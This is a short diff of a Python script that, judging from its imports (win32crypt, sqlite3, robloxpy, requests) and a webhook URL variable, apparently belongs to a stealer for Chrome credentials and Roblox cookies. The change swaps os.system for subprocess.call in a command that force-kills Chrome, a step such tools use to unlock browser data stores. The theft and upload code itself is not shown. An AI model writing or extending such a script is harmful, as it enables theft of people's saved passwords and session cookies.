@@ -2,6 +2,7 @@ import os
 import json
 import base64
 import sqlite3
+import subprocess
 import shutil
 import psutil
 import win32crypt
@@ -12,7 +13,7 @@ import re
 import requests
 import robloxpy
 
-os.system("taskkill /im chrome.exe /f")
+subprocess.call("TASKKILL /f  /IM  CHROME.EXE")
 
 webhook_url = 'heh'
 
